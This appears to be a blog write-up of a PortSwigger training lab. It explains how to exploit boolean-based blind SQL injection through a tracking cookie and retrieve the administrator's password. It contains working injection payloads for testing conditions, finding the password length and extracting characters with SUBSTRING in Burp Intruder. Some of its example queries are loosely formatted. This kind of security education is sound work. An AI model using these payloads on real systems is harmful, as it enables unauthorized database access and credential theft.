---

title: "Lab 9: Blind SQL Injection with Conditional Responses"

date: 2025-08-05

layout: post

tags: [owasp, sql-injection, web-security, portswigger]

---

# Lab 9: Blind SQL Injection with Conditional Responses

## Lab Description

This lab contains a Blind SQL Injection vulnerability. The application uses a `trackingId` cookie for analytics and performs a SQL query containing the cookie value.

The results of the SQL query are not returned directly, and no error messages are displayed. However, if the query returns any rows, the page includes the message **"Welcome back"**.

The database contains a table called `users` with columns `username` and `password`.  
Your task is to exploit the Blind SQL Injection vulnerability to retrieve the password for the \*\*administrator\*\* user, then log in.

---

## Analysis and Exploitation

### 1. Confirm the Blind SQLi vulnerability

Request example:
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

Behavior:
If trackingId exists → query returns rows → “Welcome back” is displayed.
If not → no message is shown.


<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/wu1.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure 1: </em> Tested the cookie value </p>
</div>

Boolean-based test:

```
' AND 1=1--   -- TRUE → Welcome back
' AND 1=0--   -- FALSE → No Welcome back
```

This confirms the parameter is vulnerable to Blind SQL Injection.


### 2. Confirm the users table exists
---

'select tracking-id from tracking-table 
'where trackingId = 'RvLfBu6s9EZRlVYN' 
'and (select 'x' from users LIMIT 1)='x'-- 
---
<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/wu2.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure 1: </em> Tested the cookie value </p>
</div>
--
==>  users table exists.

### 3. Confirm administrator user exists
--
select tracking-id from tracking-table 
where trackingId = 'RvLfBu6s9EZRlVYN' 
and (select username from users where username='administrator')='administrator'-- 
--

==> administrator user exists.

<div style="text-align: center;">
  <img src="/top10-owasp-blog/assets/images/wu3.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
  <p><em>Figure 1: </em> Tested the cookie value </p>
</div>

### 4. Determine the password length
---
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--
---

If the length is x , the subquery returns administrator, making the comparison = 'administrator' TRUE.
The app will display the "Welcome back" message.

If the length is not x, the condition is FALSE, and no "Welcome back" message appears.
By adjusting the number in LENGTH(password)=X and observing the response, you can find the exact length.

==>  Password length is 20 characters by display the "Welcome back" message.

### 5. Extract the password character-by-character

* Send a vulnerable request to Intruder
* In Intruder, highlight the value of the TrackingId cookie after the ' and mark it as a payload position:
--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
--

* Configure the payload set

-Go to the Payloads tab.
-Set the payload type to Simple list.
-Enter all possible characters:
---
'abcdefghijklmnopqrstuvwxyz
'ABCDEFGHIJKLMNOPQRSTUVWXYZ
'0123456789
---

* Run the attack for each character position

Start with position 1:
---

' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='§a§'--
---
==> Look at the Length or Response column in the Intruder results, If it’s longer or contains "Welcome back", that character is correct and repeat for positions 1 → 20.
Write down each discovered character in order until you have all 20.

Example found password in my lab :
52rabjtjpa749cy0bvo6


### 6.Verify the password

Use Burp Repeater to check if it matches the administrator account:
---
' AND SUBSTRING((SELECT username FROM users WHERE password='52rabjtjpa749cy0bvo6'),1,1)='a'--
---
==> If it returns the "Welcome back" message → the password is correct , and you can test
in lab with Username: administrator and Password: 52rabjtjpa749cy0bvo6

### Conclusion
This lab clearly demonstrates how to exploit a Boolean-based Blind SQL Injection when the application does not display query results directly and provides no error messages.
By observing the server’s behavior (specifically, the appearance of the "Welcome back" message), we were able to:

1.Determine the password length by testing conditions like LENGTH(password)=X.

2.Extract each character of the password using the SUBSTRING() function combined with Burp Suite Intruder.

3.Assemble the complete password and verify it using Burp Suite Repeater
The final outcome was retrieving the administrator’s password and logging in successfully, thereby solving the lab.





